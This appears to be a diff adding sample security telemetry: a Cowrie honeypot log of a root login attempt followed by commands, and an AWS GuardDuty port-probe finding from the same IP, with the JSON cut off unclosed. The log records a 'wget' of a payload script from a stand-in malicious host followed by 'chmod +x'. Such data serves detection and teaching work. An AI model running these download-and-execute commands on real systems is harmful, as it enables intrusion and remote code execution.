@@ -1,0 +1,18 @@
+cowrie-attack-log.txt
+
+2025-07-01 10:32:14 login attempt [root:123456] from 185.142.234.9
+2025-07-01 10:32:19 command issued: wget http://malicious.com/payload.sh
+2025-07-01 10:32:22 command issued: chmod +x payload.sh
+
+guardduty-findings.json
+{
+"type": "Recon:EC2/PortProbeUnprotectedPort",
+"resource": { "instanceId": "i-abc123" },
+"remoteIpDetails": { "ipAddressV4": "185.142.234.9" },
+"service": {
+"action": {
+"portProbeAction": {
+"port": 22,
+"protocol": "TCP"
+}
+}
